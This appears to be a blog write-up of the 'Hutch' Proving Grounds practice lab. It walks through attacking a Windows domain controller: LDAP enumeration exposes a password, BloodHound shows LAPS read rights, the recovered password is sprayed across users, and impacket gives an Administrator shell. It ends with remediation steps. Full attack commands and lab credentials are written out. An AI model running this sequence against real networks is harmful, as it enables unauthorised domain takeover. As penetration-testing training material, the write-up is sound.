---
layout: writeup
title: Hutch - Proving Grounds
date: 2024-09-01 13:32:20 +0300
description: A Writeup of the Hutch Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, Bloodhound, LAPS, Cadaver]
---

Ok, here's a writeup of Craft2 from [Proving Grounds](https://www.offsec.com/labs/). It is part of TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#), and Proving Grounds has rated it to be Intermediate, though the Proving Grounds Community has rated it as Hard. As usual, I kick things off with an nmap scan, using vanilla nmap for this one with a few flags. The full command is: `nmap -A -sC -p- -v -T4 --open -o nmap.txt 192.168.248.122`

We have quite a few ports open here:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Wed, 21 Aug 2024 22:26:33 GMT
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-21 22:25:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49755/tcp open  msrpc         Microsoft Windows RPC

```

First off, we can see from the output that the machine is in the `hutch.offsec` domain so we add that to our `/etc/hosts` file. We also have a few different ports to try for low hanging fruit, and we have a web server on port 80, so I run a directory scan in the background while I run a few other commands the easy stuff. 

For sub-domains: `gobuster dns -d hutch.offsec -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
For directories: `feroxbuster -u http://hutch.offsec`

Neither of these turn up anything interesting, especially given when we actually check the browser, we see we have a Windows Server landing page for port 80. 

![Hutch1.png](/assets/images/Hutch/Hutch1.png){: .responsive-image}

No matter, like I said there are a few other commands to check. For the smb server on port 445, we run `smbclient -L \\\\192.168.248.122\\ -N` which does connect but doesn't list shares. We run enum4linux (`enum4linux -a hutch.offsec > enum4linux`) to check if anything stands out, but we don't get much beyond a confirmation of the domain. We do see LDAP is showing on a few ports, so we check ldapsearch, and that shows a bit more interesting stuff: `ldapsearch -x -H ldap://192.168.248.122 -b "dc=hutch,dc=offsec" > ldapsearch`. 

We can `grep` the output for name, userPrincipalName, and perhaps most useful, sAMAccountName:

![Hutch2.png](/assets/images/Hutch/Hutch2.png){: .responsive-image}

This looks like a pretty good list of users on the back half. We can look around a bit more and confirm Administrator is there as usual as well. So that's pretty helpful, and we can add them all to a users file using cut: `cat ldapsearch | grep sAMAccountName | cut -d : -f 2 > usernames.txt`. We should get rid of everything except Guest (+ Administrator), but it's faster than doing it manually. Usernames.txt now looks like this:
```
Administrator 
Guest
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```

We search through the ldapsearch output a bit more, and we find something else interesting in the description entry for `fmcsorley`: 

![Hutch3.png](/assets/images/Hutch/Hutch3.png){: .responsive-image}

Could it be a clue?! We can go back over pretty much everything now that we actually have a potential password to test with. We try a few of the same commands with creds now (as well as a few RCE attempts with impacket), and it works with smbclient (We also add `fmcsorley:CrabSharkJellyfish192` to creds.txt):

![Hutch4.png](/assets/images/Hutch/Hutch4.png){: .responsive-image}

Unfortunately, it seems like both NETLOGON and SYSVOL are empty. Interesting. At that point I decided to just get more information from `bloodhound-python` to see if I could find anything:

`bloodhound-python -u "fmcsorley" -p 'CrabSharkJellyfish192' -d hutch.offsec -c all --zip -ns 192.168.248.122`

![Hutch5.png](/assets/images/Hutch/Hutch5.png){: .responsive-image}

We can see from clicking around for a little bit that the user we already have access to has the `ReadLAPSPassword` permission. This is 


`nxc ldap 192.168.248.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.248.122 -M laps`

![Hutch6.png](/assets/images/Hutch/Hutch6.png){: .responsive-image}

I didn't actually know which user this password corresponded to, so I ran `nxc` to check against the list of usernames I had access to:`nxc smb 192.168.248.122 -u usernames.txt -p 'z]8oLLqK5vSeD+' -d hutch.offsec --continue-on-success`

![Hutch7.png](/assets/images/Hutch/Hutch7.png){: .responsive-image}

And it looks like it's the Administrator! Nice, so the only thing left to do is pop a shell and get some flags. I foolishly used impacket-smbexec instead of evil-winrm, but thats how you know I'm not just copy/pasting this from another author: `impacket-smbexec hutch.offsec/Administrator:z]8oLLqK5vSeD+@192.168.248.122`

![Hutch8.png](/assets/images/Hutch/Hutch8.png){: .responsive-image}

#### Lessons learned
- I realized that while I got the proof.txt immediately because I got access as Administrator, there actually are two flags on this box. When I tried to use `cd` to look around, I realized that I couldn't because I was using `impacket-smbexec`. So that's a point for `evil-winrm`.
- Also, in bloodhound make sure to every high value target as high value. In this case the target host wasn't, just the DC, even though I think they are effectively the same. 

![Hutch9.png](/assets/images/Hutch/Hutch9.png){: .responsive-image}

- I didn't know this, but after reading some other writeups after the fact, it seems that we should notice that there is a webdav share available, and there is a tool called `cadaver` which allows us to access it and treat it much like an FTP server or SMB share. In this case, we are able to put a reverse shell there or at least a web shell. We can then visit it in the browser by going to `http://$target/shell`. 

![Hutch10.png](/assets/images/Hutch/Hutch10.png){: .responsive-image}

#### Remediation Steps
- Remove fmcsorley's password from the description. 
- Remove fmcsorley's ability to readLAPSPassword if they don't need it. 
- Secure the webdav share. 